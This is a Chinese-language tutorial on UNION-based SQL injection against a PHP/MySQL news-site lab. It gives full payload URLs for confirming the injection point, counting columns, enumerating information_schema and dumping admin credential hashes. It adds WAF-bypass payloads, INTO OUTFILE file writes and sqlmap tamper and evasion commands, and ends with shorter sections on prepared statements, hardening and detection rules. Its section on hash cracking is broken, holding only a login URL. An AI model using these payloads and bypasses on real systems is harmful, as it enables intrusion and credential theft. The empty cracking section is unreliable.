## 案例一：联合查询注入获取管理员密码

联合查询注入（UNION-Based SQL Injection）是SQL注入中最直观、最经典的攻击方式。攻击者通过`UNION SELECT`语句将恶意查询的结果与原始查询结果合并，直接在页面上看到数据库中的敏感数据——包括用户名、密码哈希、邮箱等。本案例以一个真实的新闻发布系统为靶场，完整演示从发现注入点到提取管理员密码的全过程，并深入剖析每一步背后的原理。

### 1 联合查询注入原理

#### 1.1 UNION SELECT的工作机制

SQL的`UNION`操作符用于合并两个或多个`SELECT`语句的结果集。关键约束是：**所有SELECT语句必须拥有相同数量的列，且对应列的数据类型必须兼容**。

```sql
-- 正常查询：返回文章详情
SELECT id, title, content FROM articles WHERE id = 1;

-- 注入后：将恶意查询结果拼接到正常结果后面
SELECT id, title, content FROM articles WHERE id = -1
UNION SELECT 1, 'admin:e10adc3949ba59abbe56e057f20f883e', 'hacked'-- ;
```

为什么用`id=-1`？因为原始查询条件`id=-1`不会匹配任何记录，这样页面只会显示`UNION SELECT`注入的结果，避免正常数据干扰攻击者的观察。

#### 1.2 联合查询注入的前提条件

并非所有SQL注入都能使用联合查询。必须满足以下条件：

| 前提条件 | 说明 |
|---------|------|
| 注入点存在 | 应用程序将用户输入直接拼接到SQL语句中 |
| SQL语句有回显 | 查询结果会显示在页面上（错误信息、文章内容、搜索结果等） |
| 可以使用UNION | 后端数据库支持`UNION`操作符，且没有被WAF过滤 |
| 已知列数 | 必须使注入的SELECT语句列数与原始查询一致 |

如果页面不回显数据（比如只返回"存在"或"不存在"），则需要改用盲注技术（参见案例二）。

#### 1.3 联合查询注入与其他注入方式的对比

| 注入方式 | 数据获取方式 | 适用场景 | 难度 |
|---------|------------|---------|------|
| **联合查询注入** | 直接在页面显示 | 页面有回显 | ★★☆ |
| 报错注入 | 通过错误信息泄露 | 有错误回显但无数据回显 | ★★☆ |
| 布尔盲注 | 通过页面True/False差异 | 无任何回显 | ★★★ |
| 时间盲注 | 通过响应延迟判断 | 无任何回显，页面无差异 | ★★★★ |
| 堆叠注入 | 执行多条独立SQL | 支持多语句执行 | ★★★ |
| 带外注入 | 通过DNS/HTTP外带数据 | 无回显且盲注受限 | ★★★★ |

联合查询注入是最优先尝试的方式——因为它效率最高、步骤最少、结果最直观。

### 2 目标场景与漏洞代码分析

#### 2.1 靶场环境

本案例的靶场是一个基于PHP+MySQL的新闻发布系统，使用`mysqli`扩展连接数据库。系统功能简单：用户通过URL参数`?id=N`查看对应文章。

#### 2.2 漏洞代码

```php
<?php
// news.php —— 存在SQL注入漏洞的新闻发布页面
$id = $_GET['id'];                           // 直接获取用户输入，没有任何过滤
$conn = mysqli_connect("localhost", "root", "", "news_db");  // 数据库连接

// 漏洞核心：用户输入直接拼接到SQL字符串中
$query = "SELECT * FROM articles WHERE id = '$id'";
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_assoc($result);

echo "<h1>" . $row['title'] . "</h1>";
echo "<p>" . $row['content'] . "</p>";
?>
```

#### 2.3 漏洞根因分析

这段代码的问题出在第5行：

```php
$query = "SELECT * FROM articles WHERE id = '$id'";
```

`$id`来自`$_GET['id']`，是用户完全可控的输入。代码将其直接嵌入SQL字符串，没有任何过滤、转义或参数化处理。当用户输入`1'`时，生成的SQL变为：

```sql
SELECT * FROM articles WHERE id = '1''
```

多出的单引号导致SQL语法错误，暴露了注入点。攻击者可以构造任意SQL逻辑来操控查询行为。

#### 2.4 安全编码对照

正确的做法是使用**参数化查询（Prepared Statement）**：

```php
<?php
// 安全版本：使用预处理语句
$id = $_GET['id'];
$conn = mysqli_connect("localhost", "root", "", "news_db");

// 使用占位符 ? 代替直接拼接
$stmt = $conn->prepare("SELECT * FROM articles WHERE id = ?");
$stmt->bind_param("i", $id);   // "i" 表示整数类型，自动做类型检查
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();

echo "<h1>" . htmlspecialchars($row['title']) . "</h1>";
echo "<p>" . htmlspecialchars($row['content']) . "</p>";
?>
```

参数化查询让数据库将用户输入始终视为**数据**而非**代码**，从根源上消除注入风险。

### 3 攻击全流程详解

以下是从零开始的完整攻击步骤。每一步都解释了"做什么、为什么这样做、预期结果是什么"。

#### 3.1 Step 1：确认注入点

**目的**：验证目标参数是否存在SQL注入漏洞。

**方法**：通过构造真假条件，观察页面响应是否发生变化。

```bash
# 原始请求：正常页面
http://target/news.php?id=1

# 测试1：添加单引号，观察是否报错
http://target/news.php?id=1'
# 预期：SQL语法错误（说明单引号被拼接进了SQL语句）

# 测试2：闭合单引号，构造永真条件
http://target/news.php?id=1' and '1'='1
# 预期：正常显示文章（条件为真，查询正常执行）

# 测试3：构造永假条件
http://target/news.php?id=1' and '1'='2
# 预期：页面无内容或显示异常（条件为假，查询无结果）
```

**判断标准**：

| 输入 | 页面表现 | 结论 |
|------|---------|------|
| `id=1'` | 报错（如MySQL语法错误） | 大概率存在注入 |
| `id=1' and '1'='1` | 正常显示 | 确认存在字符型注入 |
| `id=1' and '1'='2` | 无内容/异常 | 确认存在字符型注入 |
| 以上三种均无变化 | 页面无差异 | 可能是数字型注入，或不存在注入，需进一步测试 |

**字符型vs数字型注入的区别**：

```bash
# 数字型注入（参数未被引号包裹）
# 原始SQL: SELECT * FROM articles WHERE id = 1
# 注入:    SELECT * FROM articles WHERE id = 1 and 1=1
# 测试:    http://target/news.php?id=1 and 1=1

# 字符型注入（参数被单引号包裹）
# 原始SQL: SELECT * FROM articles WHERE id = '1'
# 注入:    SELECT * FROM articles WHERE id = '1' and '1'='1'
# 测试:    http://target/news.php?id=1' and '1'='1
```

本案例中，代码使用`WHERE id = '$id'`（单引号包裹），属于**字符型注入**，攻击者需要先闭合单引号再注入SQL逻辑。

#### 3.2 Step 2：判断原始查询的列数

**目的**：确定原始`SELECT`语句返回多少列，以便构造列数一致的`UNION SELECT`。

**方法**：使用`ORDER BY`子句逐列探测。

```bash
# ORDER BY 1：按第1列排序 → 正常（至少有1列）
http://target/news.php?id=1' order by 1-- -

# ORDER BY 2：按第2列排序 → 正常（至少有2列）
http://target/news.php?id=1' order by 2-- -

# ORDER BY 3：按第3列排序 → 正常（至少有3列）
http://target/news.php?id=1' order by 3-- -

# ORDER BY 4：按第4列排序 → 报错！（不存在第4列）
http://target/news.php?id=1' order by 4-- -
```

**结论**：原始查询返回**3列**（`ORDER BY 3`正常，`ORDER BY 4`报错）。

**为什么用二分法？** 当列数较多时（比如10+列），逐个测试效率低。二分法：先测`ORDER BY 10`，正常则测`ORDER BY 20`，报错则测`ORDER BY 5`，如此折半逼近，可以在`log₂(N)`步内确定列数。

```bash
# 二分法示例（假设列数未知）
http://target/news.php?id=1' order by 10-- -    # 报错 → 少于10列
http://target/news.php?id=1' order by 5-- -     # 报错 → 少于5列
http://target/news.php?id=1' order by 3-- -     # 正常 → 3或4列
http://target/news.php?id=1' order by 4-- -     # 报错 → 正好3列
```

**注意事项**：

- 注释符`--`后面需要一个空格（或使用`--+`、`%23`即`#`）。某些场景下`--`后不加空格会被当作参数值的一部分而非注释。
- `ORDER BY`后面可以直接跟列序号（数字），也可以跟列名，但在注入场景中通常用数字。

#### 3.3 Step 3：找到页面回显位

**目的**：确认`UNION SELECT`的哪些列会显示在页面上。

**方法**：注入一组数字，观察页面哪些位置出现了这些数字。

```bash
# id=-1 让原始查询返回空结果，只显示UNION注入的内容
http://target/news.php?id=-1' union select 1,2,3-- -
```

假设页面显示结果为：

```html
<h1>2</h1>
<p>3</p>
```

**分析**：`title`位置（第2列）和`content`位置（第3列）是可显示的，可以用来输出数据库信息。第1列（`id`）通常不在页面上展示。

**为什么用`id=-1`？** 如果用`id=1`，原始查询会返回`id=1`的文章数据，UNION注入的数据混在一起难以分辨。用一个不存在的ID值（如`-1`或`0`），原始查询不返回任何行，页面上显示的就全部是注入的数据。

**特殊情况：LIMIT限制**。有些查询使用了`LIMIT 1`，此时即使UNION注入成功，也只显示第一行。解决方法是在注入SQL末尾也加上`LIMIT`或者用`GROUP_CONCAT`将多行合并为一行。

#### 3.4 Step 4：获取数据库基本信息

**目的**：获取当前数据库名称和MySQL版本，为后续攻击提供基础信息。

```bash
# 在第2、3列位置插入信息函数
http://target/news.php?id=-1' union select 1,database(),version()-- -
```

假设页面显示：

```html
<h1>news_db</h1>
<p>5.7.34</p>
```

**关键信息解读**：

| 函数 | 返回值 | 攻击价值 |
|------|-------|---------|
| `database()` | `news_db` | 当前数据库名，后续查表时需要 |
| `version()` | `5.7.34` | MySQL版本，影响可用的攻击手法和已知漏洞 |
| `user()` | `root@localhost` | 当前数据库用户，判断权限等级 |
| `@@datadir` | `/var/lib/mysql/` | 数据库文件目录，写WebShell时需要 |
| `@@basedir` | `/usr/` | MySQL安装目录 |

```bash
# 一次性获取多个信息
http://target/news.php?id=-1' union select 1,
  concat_ws(0x7e,database(),version(),user()),
  @@datadir-- -
# 返回: news_db~5.7.34~root@localhost
```

`concat_ws(0x7e, ...)`使用`~`（0x7e的ASCII码）作为分隔符连接多个值，避免用逗号（逗号可能与UNION的列分隔冲突）。`0x7e`是十六进制的`~`字符。

**版本信息的攻击意义**：

- **MySQL < 5.0**：没有`information_schema`，需要靠暴力猜表名/列名
- **MySQL 5.x**：支持`information_schema`，可以系统地枚举所有表和列
- **MySQL 8.x**：默认使用`caching_sha2_password`认证插件，与5.x的`mysql_native_password`不同，影响后续UDF提权等操作

#### 3.5 Step 5：枚举数据库表名

**目的**：获取目标数据库中所有表的名称，找到存储敏感数据（如用户账号密码）的表。

```bash
# 查询news_db数据库下的所有表名
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(table_name),
  3 FROM information_schema.tables WHERE table_schema='news_db'-- -
```

假设页面显示：

```html
<h1>articles,admin_users,comments</h1>
```

**`information_schema`深度解析**：

`information_schema`是MySQL自带的元数据库，存储了所有数据库、表、列的结构信息。攻击者利用它可以系统地枚举整个数据库的结构。

| 核心表 | 存储内容 | 常用查询字段 |
|-------|---------|------------|
| `schemata` | 所有数据库名 | `schema_name` |
| `tables` | 所有表名及所属数据库 | `table_name`, `table_schema` |
| `columns` | 所有列名及所属表 | `column_name`, `table_name` |

```sql
-- 查询所有数据库名
SELECT schema_name FROM information_schema.schemata;

-- 查询指定数据库下的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='news_db';

-- 查询指定表的所有列
SELECT column_name FROM information_schema.columns WHERE table_name='admin_users';
```

**`GROUP_CONCAT`的作用**：默认的`UNION SELECT`每个列只能显示一行数据。`GROUP_CONCAT()`将多行结果拼接成一个字符串，这样所有表名都能在一行中显示出来。默认分隔符是逗号。

```bash
# 自定义分隔符（避免与数据中的逗号混淆）
GROUP_CONCAT(table_name SEPARATOR 0x0a)
# 0x0a = 换行符，每个表名占一行
```

**当表名太多时**：`GROUP_CONCAT`默认最大长度为1024字节。如果表名总长度超过限制，部分表名会被截断。

```bash
# 增大GROUP_CONCAT的最大长度
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(table_name),
  3 FROM information_schema.tables
  WHERE table_schema='news_db'
  LIMIT 0,100-- -
```

或者分批查询：

```bash
# 分批获取（前10个表）
...WHERE table_schema='news_db' LIMIT 0,10-- -

# 分批获取（第11-20个表）
...WHERE table_schema='news_db' LIMIT 10,10-- -
```

#### 3.6 Step 6：获取目标表的列结构

**目的**：确定`admin_users`表有哪些列，找到存储用户名和密码的字段名。

```bash
# 查询admin_users表的所有列名
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(column_name),
  3 FROM information_schema.columns WHERE table_name='admin_users'-- -
```

假设页面显示：

```html
<h1>id,username,password,email</h1>
```

**列信息的更多细节**：

```bash
# 获取列的详细信息（数据类型、是否可空等）
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(column_name,0x3a,data_type,0x3a,is_nullable),
  3 FROM information_schema.columns WHERE table_name='admin_users'-- -
# 返回: id:int:NO,username:varchar:NO,password:varchar:NO,email:varchar:YES
```

**为什么需要先查列名？** 不能直接`SELECT password FROM admin_users`——如果你不知道密码列叫什么名字。有些系统用`passwd`、`user_pass`、`pwd_hash`等不同命名。另外，确认列名可以避免猜测导致的SQL错误。

**常见的敏感表和列名模式**：

| 系统类型 | 常见用户表名 | 常见密码列名 |
|---------|------------|------------|
| WordPress | `wp_users` | `user_pass` |
| Drupal | `users_field_data` | `pass` |
| Joomla | `jos_users` | `password` |
| 自定义系统 | `users`, `admin`, `members`, `accounts` | `password`, `passwd`, `pwd`, `pass_hash` |
| 论坛系统 | `cdb_members`, `pre_ucenter_members` | `password` |

#### 3.7 Step 7：提取管理员账号密码

**目的**：从`admin_users`表中提取用户名和密码哈希值。

```bash
# 提取username和password字段
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(username,0x3a,password),
  3 FROM admin_users-- -
```

假设页面显示：

```html
<h1>admin:e10adc3949ba59abbe56e057f20f883e,editor:a87ff679a2f3e71d9181a67b7542122c</h1>
```

**分析密码哈希**：

| 用户名 | 密码哈希 | 哈希类型 | 明文密码 |
|-------|---------|---------|---------|
| `admin` | `e10adc3949ba59abbe56e057f20f883e` | MD5 | `123456` |
| `editor` | `a87ff679a2f3e71d9181a67b7542122c` | MD5 | `4` |

`e10adc3949ba59abbe56e057f20f883e`是`123456`的MD5哈希值，这是最常见的弱密码之一。

**密码哈希类型识别**：

| 哈希格式 | 长度 | 类型 | 示例 |
|---------|------|------|------|
| 纯32位十六进制 | 32字符 | MD5 | `e10adc3949ba59abbe56e057f20f883e` |
| 纯40位十六进制 | 40字符 | SHA-1 | `7c4a8d09ca3762af61e59520943dc26494f8941b` |
| 纯64位十六进制 | 64字符 | SHA-256 | `8d969eef6ecad3c...` |
| `$2y$`开头 | 60字符 | bcrypt | `$2y$10$N9qo8uLOickgx2ZM...` |
| `$6$`开头 | 可变 | SHA-512 crypt | `$6$rounds=5000$salt$hash...` |
| `$P$`开头 | 34字符 | PHPass (WordPress) | `$P$Bxo.H3FhgrXKM...` |
| `0x`开头 | 可变 | MySQL内部哈希 | 通常不出现在应用层 |

**破解密码哈希的方法**：

```bash

http://target/admin/login.php

```

### 4 关键技术细节与变体

#### 4.1 注释符的选择

| 注释符 | URL编码 | 适用场景 |
|-------|---------|---------|
| `-- `（两个减号+空格） | `--+` 或 `--%20` | MySQL标准注释，最常用 |
| `#` | `%23` | MySQL单行注释 |
| `-- -` | `--+-` | 用减号代替空格，规避部分WAF |
| `/**/` | `/**/` | 内联注释，可用于绕过空格过滤 |
| `%00` | `%00` | 空字节截断，特定PHP版本有效 |

#### 4.2 WAF绕过技巧

当目标部署了Web应用防火墙时，原始payload可能被拦截。以下是常见的绕过方法：

**关键字大小写变换**：

```bash
# 被拦截: UNION SELECT
# 绕过:   uNiOn SeLeCt
```

**关键字双写（针对只替换一次的WAF）**：

```bash
# 被拦截: UNION SELECT
# 绕过:   UNIUNIONON SELSELECTECT
# WAF删除中间的UNION/SELECT后，剩下的拼接为 UNION SELECT
```

**内联注释拆分关键字**：

```bash
# 被拦截: UNION SELECT
# 绕过:   /*!UNION*/ /*!SELECT*/
# 或:    /*!50000UNION*/ /*!50000SELECT*/
# 50000表示MySQL版本>=5.0.0时执行
```

**编码绕过**：

```bash
# URL双重编码
# ' → %2527（第一次编码%27，第二次%2527）

# 十六进制替代字符串
# 'news_db' → 0x6E6577735F6462

# 字符串拼接（MySQL不支持直接拼接，但可以用其他方式）
# database() → substr(database(),1,1) 等逐字符获取
```

**空白符替代**：

```bash
# 空格被过滤时的替代方案
/**/      → 内联注释充当空白
%09       → Tab键
%0a       → 换行符
%0b       → 垂直Tab
%0c       → 换页符
%0d       → 回车符
%a0       → 不间断空格（某些环境有效）
```

#### 4.3 十六进制与字符编码处理

当目标WAF过滤了引号时，可以用十六进制代替字符串：

```bash
# 原始payload
...WHERE table_schema='news_db'-- -

# 十六进制绕过（不需要引号）
...WHERE table_schema=0x6E6577735F6462-- -

# char()函数绕过
...WHERE table_schema=char(110,101,119,115,95,100,98)-- -
```

字符串转十六进制：

```python
# Python转换
print('news_db'.encode().hex())  # 输出: 6e6577735f6462

# 或使用在线工具
# https://www.convertstring.com/EncodeDecode/HexEncode
```

#### 4.4 导出数据到文件（INTO OUTFILE / INTO DUMPFILE）

如果MySQL用户有`FILE`权限，可以直接将查询结果写入服务器文件：

```bash
# 将管理员密码写入Web目录下的文本文件
http://target/news.php?id=-1' union select 1,
  GROUP_CONCAT(username,0x3a,password),
  3 FROM admin_users
  INTO OUTFILE '/var/www/html/passwd.txt'-- -
```

**前提条件**：
- MySQL用户拥有`FILE`特权
- 目标目录对MySQL进程可写
- 目标文件不存在（不能覆盖已有文件）
- `secure_file_priv`变量允许写入（MySQL 5.6+默认限制在指定目录）

```sql
-- 查看secure_file_priv设置
SHOW VARIABLES LIKE 'secure_file_priv';
-- 空值=不限制, NULL=禁止, 路径=只能在该目录下操作
```

#### 4.5 SQLMap自动化利用

手动注入虽然有助于理解原理，但实际渗透测试中通常使用自动化工具。SQLMap是最强大的SQL注入自动化工具：

```bash
# 基本检测
sqlmap -u "http://target/news.php?id=1" --batch

# 指定注入类型为UNION
sqlmap -u "http://target/news.php?id=1" --technique=U --batch

# 枚举数据库
sqlmap -u "http://target/news.php?id=1" --dbs --batch

# 枚举指定数据库的表
sqlmap -u "http://target/news.php?id=1" -D news_db --tables --batch

# 枚举指定表的列
sqlmap -u "http://target/news.php?id=1" -D news_db -T admin_users --columns --batch

# 导出指定表的数据
sqlmap -u "http://target/news.php?id=1" -D news_db -T admin_users --dump --batch

# 指定注入参数（POST请求时需要）
sqlmap -u "http://target/login.php" --data="user=admin&pass=123" -p user --batch

# 自定义Cookie（需要登录态才能访问的页面）
sqlmap -u "http://target/news.php?id=1" --cookie="PHPSESSID=abc123" --batch

# 设置代理（用于调试或隐藏流量）
sqlmap -u "http://target/news.php?id=1" --proxy="http://127.0.0.1:8080" --batch

# 绕过WAF的tamper脚本
sqlmap -u "http://target/news.php?id=1" --tamper=space2comment,between --batch

# 常用tamper脚本
# space2comment     : 空格替换为/**/
# between           : >替换为NOT BETWEEN 0 AND #
# randomcase        : 随机大小写
# charencode        : URL编码所有字符
# equaltolike       : =替换为LIKE
# multiplespaces    : 关键字周围插入多个空格
```

**SQLMap Tamper脚本组合推荐**：

```bash
# MySQL + WAF绕过组合
sqlmap -u "http://target/news.php?id=1" \
  --tamper=space2comment,randomcase,between,equaltolike \
  --level=3 --risk=2 --batch

# 混淆严重的WAF
sqlmap -u "http://target/news.php?id=1" \
  --tamper=space2comment,charencode,randomcase,between,percentage \
  --random-agent --delay=1 --batch
```

### 5 实战中的常见问题与排错

#### 5.1 ORDER BY不报错

**问题**：`ORDER BY 100`也不报错，无法确定列数。

**原因**：某些数据库或查询语句中，`ORDER BY`对超出范围的列号会静默忽略。

**解决方案**：

```bash
# 方法1：使用UNION SELECT逐列递增测试
http://target/news.php?id=-1' union select 1-- -           # 1列
http://target/news.php?id=-1' union select 1,2-- -         # 2列
http://target/news.php?id=-1' union select 1,2,3-- -       # 3列
http://target/news.php?id=-1' union select 1,2,3,4-- -     # 4列
# 当列数不对时会报错，报错的那个数减1就是正确列数
```

#### 5.2 页面不显示查询结果

**问题**：注入成功但页面上看不到数据。

**排查步骤**：

1. 确认回显位是否正确（Step 3可能遗漏了某个位置）
2. 检查数据是否包含HTML特殊字符导致被浏览器解析（如`<script>`标签）
3. 查看页面源代码（Ctrl+U），数据可能被隐藏在HTML注释或隐藏元素中
4. 尝试将数据用`hex()`或`base64()`编码后再输出

```bash
# 将数据编码为十六进制输出
http://target/news.php?id=-1' union select 1,hex(GROUP_CONCAT(username,password)),3 FROM admin_users-- -

# 解码（在攻击机上）
echo "61646D696E..." | xxd -r -p
```

#### 5.3 单引号被过滤

**问题**：目标WAF过滤了单引号，无法闭合字符串。

**解决方案**：

```bash
# 方案1：使用十六进制代替字符串
...WHERE table_schema=0x6E6577735F6462-- -

# 方案2：使用char()函数
...WHERE table_schema=char(110,101,119,115,95,100,98)-- -

# 方案3：使用反引号（仅限表名/列名，不能用于字符串值）
...WHERE `table_schema`=database()-- -

# 方案4：如果注入点是数字型参数，根本不需要引号
...WHERE id=1 union select 1,table_name,3 from information_schema.tables where table_schema=database()-- -
```

#### 5.4 UNION被过滤

**问题**：WAF拦截了`UNION`关键字。

```bash
# 方案1：大小写混写
uNiOn SeLeCt

# 方案2：内联注释拆分
/*!50000UNION*/ /*!50000SELECT*/

# 方案3：双写绕过
UNIUNIONON SELSELECTECT

# 方案4：换用报错注入（不依赖UNION）
# EXTRACTVALUE报错注入
http://target/news.php?id=1' and extractvalue(1,concat(0x7e,(select database())))-- -

# UPDATEXML报错注入
http://target/news.php?id=1' and updatexml(1,concat(0x7e,(select database())),1)-- -
```

#### 5.5 information_schema被禁用

**问题**：MySQL 5.7+的某些安全配置会限制对`information_schema`的访问。

```bash
# 方案1：使用sys.schema替代（MySQL 5.7+）
...FROM sys.schema_table_statistics WHERE table_schema='news_db'-- -

# 方案2：使用mysql.innodb_table_stats替代（MySQL 5.6+）
...FROM mysql.innodb_table_stats WHERE database_name='news_db'-- -

# 方案3：使用innodb_index_stats替代
...FROM mysql.innodb_index_stats WHERE database_name='news_db'-- -

# 方案4：使用无列名注入技术（需要知道至少一个列名）
# 先通过报错注入获取列数，再用数字占位
...union select 1,(select `4` from (select 1,2,3,4 from admin_users limit 0,1)a),3-- -
```

### 6 防御与检测

#### 6.1 应用层防御

| 防御措施 | 实现方式 | 防御效果 |
|---------|---------|---------|
| **参数化查询** | 使用Prepared Statement | ★★★★★ 从根本上消除注入 |
| **ORM框架** | 使用Laravel Eloquent、Django ORM等 | ★★★★★ 自动参数化 |
| **输入验证** | 白名单校验（如id必须是整数） | ★★★☆ 辅助防御 |
| **输出编码** | 对输出做HTML/JS编码 | ★★☆☆ 防止XSS，不防SQL注入 |
| **最小权限** | 数据库用户只授予必要权限 | ★★★☆ 限制攻击影响范围 |
| **WAF部署** | ModSecurity、云WAF | ★★★☆ 拦截已知攻击模式 |

#### 6.2 数据库层防御

```sql
-- 1. 创建专用数据库用户，只授予SELECT权限
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_random_password';
GRANT SELECT ON news_db.articles TO 'app_user'@'localhost';
-- 这样即使存在注入，攻击者也无法读取其他表

-- 2. 禁用FILE权限，防止INTO OUTFILE
-- 不要授予FILE特权给应用用户

-- 3. 设置secure_file_priv
-- my.cnf中: secure_file_priv = /var/lib/mysql-files/

-- 4. 开启通用查询日志（用于审计，生产环境慎用）
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/query.log';
```

#### 6.3 运维层检测

```bash
# ModSecurity规则示例：检测UNION SELECT注入
SecRule ARGS "@rx (?i:union\s+select)" \
    "id:1001,phase:2,deny,status:403,\
    msg:'SQL Injection Attempt: UNION SELECT',\
    logdata:'%{MATCHED_VAR}'"

# Nginx层拦截
if ($args ~* "union.*select") {
    return 403;
}

# 日志分析：查找注入尝试
grep -iE "(union.*select|order by|information_schema|extractvalue|updatexml)" \
    /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn
```

### 7 从案例到实战的思维跃迁

本案例演示的是最基础的联合查询注入——注入点是GET参数、回显在页面上、MySQL数据库、没有WAF防护。真实环境中，你面对的挑战远比这复杂：

- **注入点可能在POST参数、Cookie、HTTP头部**——需要抓包分析
- **页面可能不回显数据**——需要盲注或带外数据传输
- **可能存在WAF/IDS**——需要绕过技巧
- **数据库可能不是MySQL**——需要适配不同数据库的语法
- **可能存在多层嵌套查询**——需要理解更复杂的SQL结构
- **密码可能使用bcrypt/Argon2等强哈希**——即使拿到哈希也难以破解

但无论环境多复杂，联合查询注入的**核心思维**不变：确认注入点 → 确定列数 → 找到回显位 → 逐步获取元数据 → 提取目标数据。这个流程是所有SQL注入攻击的基础骨架，掌握了它，其他注入方式只是在这个骨架上做变体。
